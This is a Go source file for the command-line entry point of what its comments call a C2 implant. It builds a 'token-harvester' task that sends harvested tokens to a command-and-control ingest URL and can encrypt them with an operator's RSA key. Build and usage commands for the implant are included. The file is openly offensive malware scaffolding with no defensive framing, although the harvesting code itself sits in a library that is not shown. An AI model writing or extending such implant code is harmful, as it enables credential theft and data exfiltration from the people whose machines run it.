// Package main is a minimal CLI wrapper to invoke the task library
// from the C2 implant binary.
//
// Build:
//   cd c2 && go mod init github.com/vantablack/c2
//   go mod tidy
//   go build -o bin/implant .
//
// Usage:
//   ./implant token-harvester --c2 https://c2.example.invalid/ingest
package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/vantablack/c2/tasks"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: implant <task> [args]")
		fmt.Println("tasks:", tasks.ListTasks())
		os.Exit(1)
	}
	task := os.Args[1]
	args := os.Args[2:]

	switch task {
	case "token-harvester":
		c2 := flag.NewFlagSet("token-harvester", flag.ExitOnError)
		c2url := c2.String("c2", "https://c2.example.invalid/ingest", "C2 URL")
		pubkeyPath := c2.String("pubkey", "", "path to operator RSA pubkey (PEM)")
		c2.Parse(args)
		var pubkeyPEM []byte
		if *pubkeyPath != "" {
			data, err := os.ReadFile(*pubkeyPath)
			if err != nil {
				fmt.Println("read pubkey:", err)
				os.Exit(1)
			}
			pubkeyPEM = data
		}
		if err := tasks.Dispatch("TokenHarvester", *c2url, string(pubkeyPEM)); err != nil {
			fmt.Println("task failed:", err)
			os.Exit(1)
		}
		fmt.Println("[implant] token-harvester done")
	default:
		fmt.Println("unknown task:", task)
		os.Exit(1)
	}
}
